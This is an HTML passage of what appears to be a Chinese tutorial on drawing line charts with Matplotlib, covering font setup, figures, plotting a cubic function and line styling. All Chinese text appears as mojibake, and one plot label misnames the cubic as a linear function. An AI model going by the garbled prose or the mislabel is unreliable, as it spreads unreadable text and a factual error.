<p>æ­¤å¤–ï¼Œè™½ç„¶å›¾è¡¨ç±»å‹å¤šæ ·ï¼Œä½† Matplotlib çš„è®¾è®¡æ€æƒ³ä¸æ ¸å¿ƒ API åœ¨å„ç±»å›¾è¡¨ä¸­æ˜¯å…±é€šçš„ã€‚å› æ­¤ï¼Œæ— è®ºä½ æ˜¯å¦éœ€è¦ç»˜åˆ¶æŠ˜çº¿å›¾ï¼Œ<strong>ç¬¬äºŒç« â€œç»˜å›¾åŸºç¡€ / æŠ˜çº¿å›¾ç»˜åˆ¶â€éƒ½æ˜¯å¿…è¯»çš„é‡ç‚¹</strong>ã€‚æˆ‘ä¼šä»¥æœ€ç®€å•çš„æŠ˜çº¿å›¾ä¸ºä¾‹ï¼Œç³»ç»Ÿè®²è§£å›¾å½¢æ„æˆã€åæ ‡è½´ã€çº¿æ¡æ ·å¼ã€æ ‡ç­¾æ ‡é¢˜ç­‰åŸºç¡€ç»„ä»¶ä¸å¸¸ç”¨ APIã€‚æŒæ¡è¿™ä¸€éƒ¨åˆ†åï¼Œå†å­¦ä¹ æŸ±çŠ¶å›¾ã€æ•£ç‚¹å›¾ã€å­å›¾ç»˜åˆ¶ç­‰å…¶ä»–å›¾è¡¨æ—¶ï¼Œä½ ä¼šå‘ç°å®ƒä»¬çš„ä½¿ç”¨é€»è¾‘éå¸¸ç›¸ä¼¼ï¼Œä¸Šæ‰‹ä¹Ÿä¼šè½»æ¾å¾—å¤šã€‚</p>
<h3 data-id="heading-2">äºŒ. ç»˜å›¾åŸºç¡€/æŠ˜çº¿å›¾ç»˜åˆ¶</h3>
<h4 data-id="heading-3">2.1 å®‰è£…ä¸åŸºç¡€è®¾ç½®</h4>
<p>è¦ä½¿ç”¨Matplotlibï¼Œé¦–å…ˆéœ€è¦å®‰è£…å®ƒã€‚å®‰è£…éå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨ç»ˆç«¯æˆ–å‘½ä»¤è¡Œä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š<code>pip install matplotlib</code></p>
<p>å®‰è£…å®Œæˆåï¼Œåœ¨Pythonä»£ç ä¸­å¼•å…¥Matplotlibçš„æ ¸å¿ƒç»˜å›¾æ¨¡å—ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt 
</code></pre>
<p>è¿™æ˜¯Matplotlibçš„æ ‡å‡†å¼•å…¥æ–¹å¼ï¼Œ<code>plt</code>æ˜¯çº¦å®šä¿—æˆçš„åˆ«åï¼Œæ–¹ä¾¿åç»­è°ƒç”¨ã€‚</p>
<p>Matplotlibé»˜è®¤ä¸æ”¯æŒå›¾è¡¨ä¸­å‡ºç°ä¸­æ–‡å­—ä½“ï¼Œç›´æ¥ä½¿ç”¨ä¸­æ–‡ä¼šå‡ºç°ä¹±ç ï¼ˆæ˜¾ç¤ºä¸ºæ–¹æ¡†ï¼‰ã€‚è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œåœ¨å¯¼å…¥åº“åæ·»åŠ ä»¥ä¸‹é…ç½®ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è®¾ç½®ä¸­æ–‡å­—ä½“</span>
plt.rcParams[<span class="hljs-string">"font.sans-serif"</span>] = [<span class="hljs-string">"SimHei"</span>]  <span class="hljs-comment"># ä½¿ç”¨é»‘ä½“</span>
plt.rcParams[<span class="hljs-string">"axes.unicode_minus"</span>] = <span class="hljs-literal">False</span>   <span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span>
</code></pre>
<blockquote>
<p><strong>å°æç¤º</strong>ï¼šä¸åŒæ“ä½œç³»ç»Ÿå¯ç”¨çš„ä¸­æ–‡å­—ä½“å¯èƒ½ä¸åŒã€‚Windowsç³»ç»Ÿå¸¸ç”¨<code>SimHei</code>ï¼ˆé»‘ä½“ï¼‰ã€<code>Microsoft YaHei</code>ï¼ˆå¾®è½¯é›…é»‘ï¼‰ï¼›macOSç³»ç»Ÿå¸¸ç”¨<code>PingFang SC</code>ï¼ˆè‹¹æ–¹ç®€ä½“ï¼‰ï¼›Linuxç³»ç»Ÿå¸¸ç”¨<code>Noto Sans CJK SC</code>ï¼ˆæ€æºé»‘ä½“ï¼‰ã€‚å¦‚æœ<code>SimHei</code>ä¸å¯ç”¨ï¼Œå¯ä»¥å°è¯•å…¶ä»–å­—ä½“ã€‚</p>
</blockquote>
<h4 data-id="heading-4">2.2 åŸºç¡€æŠ˜çº¿å›¾ç»˜åˆ¶</h4>
<p>è¦ç”»å›¾ï¼Œé¦–å…ˆéœ€è¦ä»€ä¹ˆï¼Ÿå½“ç„¶æ˜¯çº¸äº†ï¼Œæ²¡æœ‰çº¸ï¼Œæ€ä¹ˆç”»å›¾å‘¢ã€‚åœ¨matplotlibä¸­ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œåªä¸è¿‡æ˜¯éœ€è¦ç”»å¸ƒï¼Œæ‰èƒ½ç”»å›¾ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åˆ›å»ºä¸€ä¸ªç”»å¸ƒã€‚</p>
<pre><code class="hljs language-python" lang="python">fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))
</code></pre>
<p>è¿™é‡Œçš„<code>figsize=(6, 4)</code>è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå®½6è‹±å¯¸ã€é«˜4è‹±å¯¸çš„ç”»å¸ƒï¼Œè¿™ä¸ªå¯ä»¥è‡ªå·±æ ¹æ®éœ€æ±‚è‡ªè¡Œè®¾ç½®</p>
<p>æœ‰äº†ç”»å¸ƒï¼Œå°±è¦åœ¨ç”»å¸ƒä¸Šç”»å›¾äº†ï¼›åœ¨ç”»å›¾è¡¨ä¹‹å‰ï¼Œå…ˆæƒ³ä¸€æƒ³ï¼Œæˆ‘è¦åœ¨è¿™ä¸ªç”»å¸ƒä¸Šç”»å‡ å¼ è¡¨å‘¢ï¼Ÿå…¶å®ä¸è®ºä½ æƒ³ç”»å‡ å¼ è¡¨ï¼Œåªè¦ä½ æ˜¯é€šè¿‡ä¸Šé¢çš„ä»£ç åˆ›å»ºçš„ç”»å¸ƒï¼Œé‚£ä¹ˆè¿™ä¸ªç”»å¸ƒä¸Šå°±åªèƒ½å®¹ä¸‹ä¸€å¼ è¡¨ï¼ˆå…ˆä¸ç”¨ç®¡ä¸ºä»€ä¹ˆï¼‰ã€‚å¹¶ä¸”å˜é‡<code>ax</code>å°±æ˜¯é‚£å¼ è¡¨, <code>fig</code>å˜é‡ä»£è¡¨æ•´ä¸ªç”»å¸ƒï¼Œæš‚æ—¶æ²¡ä»€ä¹ˆç”¨ï¼Œä¸ç”¨ç®¡å®ƒã€‚</p>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬ç›´æ¥å±•ç¤ºä¸€ä¸‹è¿™ä¸ªç”»å¸ƒã€‚ä½¿ç”¨å¦‚ä¸‹ä»£ç å°±å¯ä»¥å±•ç¤ºå½“å‰ç”»å¸ƒï¼š</p>
<pre><code class="hljs language-python" lang="python">plt.show()
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/252cd821aa3b408d805b501f19aa1f8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=INpLveGyr4GhsEYjawh%2F14uiZgE%3D" alt="c1.jpg" width="50%" loading="lazy"/></p>
<p>è¿è¡Œåä¼šæ˜¾ç¤ºä¸€ä¸ªç©ºç™½åæ ‡ç³»ï¼Œå› ä¸ºæˆ‘ä»¬å•¥ä¹Ÿæ²¡ç”»ã€‚è¿™ä¸ªåæ ‡ç³»é»˜è®¤æ˜¯äºŒç»´ç›´è§’åæ ‡ç³»ï¼ŒåŒ…å«xè½´å’Œyè½´ï¼Œä»¥åŠåˆ»åº¦çº¿å’Œè¾¹æ¡†ã€‚</p>
<p>ç°åœ¨è®©æˆ‘ä»¬åœ¨åæ ‡ç³»ä¸Šç»˜åˆ¶ä¸€æ¡æŠ˜çº¿ã€‚æŠ˜çº¿ç”±ä¸€ç³»åˆ—ç‚¹è¿æ¥è€Œæˆï¼Œæ¯ä¸ªç‚¹ç”± <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span> åæ ‡ç¡®å®šï¼š</p>
<pre><code class="hljs language-python" lang="python">x = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
y = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>]
<span class="hljs-comment"># è°ƒç”¨axè¡¨ä¸Šçš„plotæ–¹æ³•ï¼Œplotå°±æ˜¯ç»˜åˆ¶æŠ˜çº¿</span>
<span class="hljs-comment"># plotå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯xåæ ‡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯yåæ ‡</span>
ax.plot(x, y)	
</code></pre>
<p><code>ax.plot()</code>å‡½æ•°å°†ä¾æ¬¡è¿æ¥åæ ‡ç‚¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>3</mn><mo separator="true">,</mo><mn>9</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>4</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>11</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,1),(2,4),(3,9),(4,7),(5,11)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">4</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">(</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">9</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">(</span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">7</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">11</span><span class="mclose">)</span></span></span></span></span>ï¼Œå½¢æˆä¸€æ¡æŠ˜çº¿ã€‚ç»˜åˆ¶å®Œæˆåï¼Œå†æ¬¡ä½¿ç”¨<code>plt.show()</code>æ˜¾ç¤ºå›¾å½¢å¦‚å›¾1æ‰€ç¤ºã€‚</p>
<p>å¦‚æœæˆ‘ä»¬åªä¼ å…¥ä¸¤ä¸ªç‚¹ï¼Œå°±å¯ä»¥ç»˜åˆ¶ä¸€æ¡è¿æ¥è¿™ä¸¤ä¸ªç‚¹çš„ç›´çº¿ï¼ˆè¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å°æŠ€å·§å“¦ï¼Œæ¯”å¦‚ç»˜åˆ¶è¾…åŠ©çº¿ã€è¶‹åŠ¿çº¿ç­‰ï¼‰</p>
<pre><code class="hljs language-python" lang="python">x1 = [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>]
y2 = [<span class="hljs-number">5</span>, <span class="hljs-number">1</span>]
ax.plot(x1, y2)	
</code></pre>
<p>ç»˜åˆ¶çš„æ•ˆæœå¦‚å›¾2æ‰€ç¤ºã€‚å¯ä»¥çœ‹åˆ°ï¼Œä¹‹å‰ç»˜åˆ¶çš„è“è‰²æŠ˜çº¿å¹¶æ²¡æœ‰è¢«â€œæ“¦é™¤â€ï¼Œè¿™æ˜¯å› ä¸ºåœ¨Matplotlibä¸­ï¼Œç»˜å›¾æ“ä½œæ˜¯<strong>è¿½åŠ </strong>çš„ï¼Œè€Œä¸æ˜¯è¦†ç›–ã€‚è¿™ç§è®¾è®¡è®©ä½ å¯ä»¥è½»æ¾åœ°åœ¨åŒä¸€å¼ å›¾ä¸Šå åŠ å¤šç§å…ƒç´ ï¼Œä»è€Œå®ç°æ›´ä¸°å¯Œçš„ä¿¡æ¯è¡¨è¾¾ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°è¯•ç»˜åˆ¶ä¸€ä¸ª<strong>ä¸€å…ƒä¸‰æ¬¡å‡½æ•°</strong>ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>âˆ’</mo><mi>x</mi><mo>+</mo><mn>2</mn><mo separator="true">,</mo><mtext>Â </mtext><mi>x</mi><mo>âˆˆ</mo><mo stretchy="false">[</mo><mo>âˆ’</mo><mn>3</mn><mo separator="true">,</mo><mn>1.5</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">f(x) = \frac{1}{2}x^{3} + x^{2} - x + 2,\space x\in [-3,1.5]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.9474em;vertical-align:-0.0833em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"/><span class="mord">2</span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">âˆ’</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1.5</span><span class="mclose">]</span></span></span></span></span></div>
<p>ä¸è¿‡åœ¨ç»˜åˆ¶ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå®šä¹‰ä¸¤ä¸ªåœ¨å‡½æ•°å¯è§†åŒ–ä¸­éå¸¸å®ç”¨çš„è¾…åŠ©å‡½æ•°ï¼ˆæœªæ¥ä¼šå¤šæ¬¡ç”¨åˆ°ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_function_to_vector</span>(<span class="hljs-params">values, func</span>):
    <span class="hljs-string">"""å°†ç»™å®šå‡½æ•°åº”ç”¨äºå€¼åˆ—è¡¨çš„æ¯ä¸ªå…ƒç´ """</span>
    <span class="hljs-keyword">return</span> [func(value) <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_range</span>(<span class="hljs-params">start, end, step</span>):
    <span class="hljs-string">"""ç”Ÿæˆä»startåˆ°endï¼ˆä¸å«endï¼‰ï¼Œæ­¥é•¿ä¸ºstepçš„åºåˆ—"""</span>
    <span class="hljs-keyword">return</span> [start + i * step <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>((end - start) / step))]
</code></pre>
<p>å¦‚æœä½ ä¸å¤ªç†è§£è¿™ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<pre><code class="hljs language-python" lang="python">a_list = generate_range(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0.5</span>)
<span class="hljs-built_in">print</span>(a_list)
<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># [1.0, 1.5, 2.0, 2.5]</span>
</code></pre>
<p>æ¥ç€ï¼Œå®šä¹‰ä¸€å…ƒä¸‰æ¬¡å‡½æ•°åŠå…¶å®šä¹‰åŸŸï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cubic_polynomial</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * x**<span class="hljs-number">3</span> + x**<span class="hljs-number">2</span> - x + <span class="hljs-number">2</span>

x = generate_range(-<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">0.05</span>)  <span class="hljs-comment"># åœ¨ [-3, 1.5] ä¸Šæ¯éš” 0.05 å–ä¸€ä¸ªç‚¹</span>
</code></pre>
<p>ç°åœ¨ï¼Œå°†æ¯ä¸ª <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span> ä»£å…¥å‡½æ•°ï¼Œå¾—åˆ°å¯¹åº”çš„  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span> å€¼ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å°† x åˆ—è¡¨ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’ç»™ cubic_polynomial å‡½æ•°ï¼Œç”Ÿæˆå¯¹åº”çš„ y åˆ—è¡¨</span>
y = apply_function_to_vector(x, cubic_polynomial)
</code></pre>
<p>ç»˜åˆ¶å›¾åƒï¼Œç»“æœå¦‚å›¾3ï¼š</p>
<pre><code class="hljs language-python" lang="python">ax.plot(x, y)
plt.show()
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6326097f206d4708a117ede6511c5f13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=psiJsZn6HHlA2zACQO4jIhUUIqc%3D" alt="c2.jpg" width="100%" loading="lazy"/></p>
<p>ä½ ä¼šçœ‹åˆ°æ›²çº¿éå¸¸å…‰æ»‘ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨åŒºé—´å†…å–äº†è¶³å¤Ÿå¤šçš„ç‚¹ï¼ˆæ­¥é•¿ 0.05ï¼‰ã€‚ç‚¹çš„å¯†åº¦è¶Šé«˜ï¼ŒæŠ˜çº¿åœ¨è§†è§‰ä¸Šå°±è¶Šæ¥è¿‘è¿ç»­çš„å‡½æ•°æ›²çº¿ã€‚</p>
<h4 data-id="heading-5">2.3 åŸºç¡€æ ·å¼</h4>
<p>å®é™…ä¸Šï¼ŒæŠ˜çº¿å›¾çš„æ ¸å¿ƒç»˜åˆ¶æ–¹æ³•å·²ç»è®²å®Œäº†ï¼Œæ¥ä¸‹æ¥çš„é‡ç‚¹æ˜¯<strong>æ ·å¼è®¾ç½®</strong>â€”â€”å¦‚ä½•è®©å›¾è¡¨æ›´æ¸…æ™°ç¾è§‚ã€‚ä¸‹é¢æ˜¯ä¸€æ®µå®Œæ•´çš„ç¤ºä¾‹ä»£ç ï¼Œæ³¨é‡Šéå¸¸è¯¦ç»†ï¼Œå»ºè®®ä½ äº²è‡ªåœ¨æœ¬åœ°è¿è¡Œï¼Œå¹¶å°è¯•ä¿®æ”¹ä¸åŒå‚æ•°ï¼Œè§‚å¯Ÿæ•ˆæœå˜åŒ–ã€‚</p>
<p><strong>ç¤ºä¾‹ä¸€:</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
plt.rcParams[<span class="hljs-string">"font.sans-serif"</span>] = [<span class="hljs-string">"SimHei"</span>] 
plt.rcParams[<span class="hljs-string">"axes.unicode_minus"</span>] = <span class="hljs-literal">False</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_function_to_vector</span>(<span class="hljs-params">values, func</span>):
    <span class="hljs-keyword">return</span> [func(value) <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_range</span>(<span class="hljs-params">start, end, step</span>):
    <span class="hljs-keyword">return</span> [start + i * step <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>((end - start) / step))]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cubic_polynomial</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * x**<span class="hljs-number">3</span> + x**<span class="hljs-number">2</span> - x + <span class="hljs-number">2</span>

<span class="hljs-comment"># cubic_polynomialçš„å¯¼å‡½æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">d_cubic_polynomial</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-number">1.5</span> * x**<span class="hljs-number">2</span> + <span class="hljs-number">2</span> * x - <span class="hljs-number">1</span>

<span class="hljs-comment"># åˆ›å»ºå›¾å½¢ä¸åæ ‡è½´</span>
fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))

<span class="hljs-comment"># ç”Ÿæˆ x å¹¶è®¡ç®— y ä¸ dy</span>
x = generate_range(-<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">0.3</span>)
y = apply_function_to_vector(x, cubic_polynomial)
dy = apply_function_to_vector(x, d_cubic_polynomial)

<span class="hljs-comment"># ç»˜åˆ¶ä¸€å…ƒä¸‰æ¬¡å‡½æ•°f(x)</span>
ax.plot(
    x,
    y,
    linewidth=<span class="hljs-number">2</span>,  				<span class="hljs-comment"># çº¿æ¡çš„å®½åº¦ï¼ˆé»˜è®¤1.5ï¼‰</span>
    linestyle=<span class="hljs-string">"-"</span>,  			<span class="hljs-comment"># çº¿æ¡çš„æ ·å¼ï¼ˆé»˜è®¤å®çº¿ï¼‰å…¶å®ƒå¯é€‰é¡¹:(å®çº¿'-', è™šçº¿'--', ç‚¹çº¿':', ç‚¹åˆ’çº¿'-.')</span>
    color=(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), 		 	<span class="hljs-comment"># çº¿æ¡çš„é¢œè‰²ï¼ˆé»‘è‰²ï¼‰ï¼ŒRGBä¸‰å…ƒç»„,0~1ä¹‹é—´çš„æµ®ç‚¹æ•°è¡¨ç¤º</span>
    <span class="hljs-comment"># color = "#FF5733"  		# ä¹Ÿå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶é¢œè‰²ä»£ç </span>
    alpha=<span class="hljs-number">0.8</span>,  				<span class="hljs-comment"># çº¿æ¡çš„ä¸é€æ˜åº¦ï¼Œå–å€¼èŒƒå›´0~1ï¼ˆé»˜è®¤1.0ï¼‰</span>
    marker=<span class="hljs-string">"o"</span>,  				<span class="hljs-comment"># æ•°æ®ç‚¹çš„æ ‡è®°æ ·å¼,åœ†å½¢ï¼ˆé»˜è®¤æ— æ ‡è®°ï¼‰, å…¶å®ƒå¯é€‰é¡¹åœ¨åæ–‡è¡¨æ ¼å¤„æŸ¥è¯¢</span>
    markersize=<span class="hljs-number">7</span>,  				<span class="hljs-comment"># æ ‡è®°ç‚¹çš„å¤§å°ï¼ˆé»˜è®¤6ï¼‰</span>
    markerfacecolor=<span class="hljs-string">"#1E3FCF"</span>,  <span class="hljs-comment"># æ ‡è®°ç‚¹çš„å¡«å……é¢œè‰²ï¼Œè“è‰²</span>
    markeredgecolor=<span class="hljs-string">"#FF5733"</span>,  <span class="hljs-comment"># æ ‡è®°ç‚¹çš„è¾¹æ¡†é¢œè‰²ï¼Œçº¢è‰²</span>
    markeredgewidth=<span class="hljs-number">1.5</span>,  		<span class="hljs-comment"># æ ‡è®°ç‚¹è¾¹æ¡†çš„å®½åº¦ï¼ˆé»˜è®¤1.0ï¼‰</span>
    markevery=<span class="hljs-number">2</span>,  				<span class="hljs-comment"># æ¯éš”ä¸¤ä¸ªæ•°æ®ç‚¹ç»˜åˆ¶ä¸€ä¸ªæ ‡è®°ç‚¹</span>
    label=<span class="hljs-string">"ä¸‰å…ƒä¸€æ¬¡å‡½æ•° $f(x)$"</span>,  <span class="hljs-comment"># ç»™è¿™æ¡æŠ˜çº¿å–ä¸€ä¸ªåå­—(ç”¨äºå›¾ä¾‹æ˜¾ç¤º),æ”¯æŒ LaTeX æ•°å­¦å…¬å¼</span>
)

<span class="hljs-comment"># ç»˜åˆ¶f(x)çš„å¯¼å‡½æ•°f'(x)</span>
ax.plot(
    x,
    dy,
    color = (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),
    alpha = <span class="hljs-number">0.6</span>,
    linestyle = <span class="hljs-string">'--'</span>,
    label = <span class="hljs-string">"å¯¼æ•° $f'(x)$"</span>
)

<span class="hljs-comment"># åæ ‡è½´æ ‡ç­¾ä¸æ ‡é¢˜</span>
ax.set_xlabel(<span class="hljs-string">"è¿™é‡Œå†™xè½´æ ‡ç­¾"</span>)
ax.set_ylabel(<span class="hljs-string">"è¿™é‡Œå†™yè½´æ ‡ç­¾"</span>)
ax.set_title(<span class="hljs-string">"è¿™é‡Œå†™è¿™å¼ è¡¨çš„æ ‡é¢˜"</span>)
